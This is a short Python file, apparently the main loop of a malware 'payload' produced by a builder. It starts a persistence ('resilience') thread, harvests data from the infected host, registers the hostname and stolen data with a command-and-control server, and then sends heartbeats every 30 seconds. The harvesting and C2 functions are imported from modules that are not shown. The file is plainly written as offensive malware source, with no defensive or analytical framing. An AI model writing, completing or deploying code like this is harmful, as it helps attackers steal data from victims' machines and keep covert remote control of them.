import time
import threading
import socket
from harvester import harvest_all_data
from resilience import manage_resilience
from comms import register_with_c2, send_heartbeat

# --- CONFIGURATION (Builder will set this) ---
ENABLE_RESILIENCE = True

def main():
    """Main execution flow for the payload."""
    if ENABLE_RESILIENCE:
        resilience_thread = threading.Thread(target=manage_resilience, daemon=True)
        resilience_thread.start()

    # Initial data harvest and registration
    harvested_data = harvest_all_data()
    hostname = socket.gethostname()
    register_with_c2(hostname, harvested_data)

    # Main loop for heartbeats
    while True:
        send_heartbeat()
        time.sleep(30) # Send heartbeat every 30 seconds

if __name__ == "__main__":
    main()